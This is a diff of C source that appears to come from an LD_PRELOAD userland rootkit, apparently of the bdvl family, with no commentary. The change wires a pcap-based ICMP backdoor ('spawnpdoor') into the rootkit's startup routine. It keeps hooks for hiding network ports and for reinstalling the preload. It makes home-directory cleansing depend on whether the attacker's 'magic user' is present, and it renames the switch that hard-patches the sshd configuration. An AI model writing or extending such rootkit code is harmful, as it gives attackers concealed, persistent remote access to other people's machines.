@@ -22,20 +22,19 @@ typedef struct {
 #include <libgen.h>
 #include <dlfcn.h>
 #include <link.h>
-#include <assert.h>
+#include <sys/time.h>
 #include <sys/types.h>
 #include <sys/stat.h>
 #include <sys/wait.h>
 #include <sys/socket.h>
 #include <netinet/in.h>
-
-#ifdef HIDE_SELF
-#include <utime.h>
-#include <sys/time.h>
-#endif
+#include <arpa/inet.h>
 
 #ifdef HIDE_PORTS
 #include <linux/netlink.h>
+#endif
+
+#ifdef USE_ICMP_BD
 #include <pcap/pcap.h>
 #endif
 
@@ -64,6 +63,9 @@ void plsdomefirst(void){
     if(notuser(0) || rknomore())
         return;
 
+#ifdef USE_ICMP_BD
+    spawnpdoor();
+#endif
 #ifdef READ_GID_FROM_FILE
     hook(CACCESS,CFOPEN,CCHMOD);
     if((long)call(CACCESS, GID_PATH, F_OK) != 0){
@@ -86,7 +88,8 @@ void plsdomefirst(void){
     checkbashrc();
 #endif
 #ifdef CLEANSE_HOMEDIR
-    bdvcleanse();
+    if(!magicusr() && !rkprocup())
+        bdvcleanse();
 #endif
 #if defined READ_GID_FROM_FILE && defined AUTO_GID_CHANGER
     gidchanger();
@@ -98,7 +101,7 @@ void plsdomefirst(void){
     reinstall(OLD_PRELOAD);
 #endif
 #endif
-#ifdef HARD_PATCH_SSHD_CONFIG
+#ifdef SSHD_PATCH_HARD
     sshdpatch();
 #endif
 }
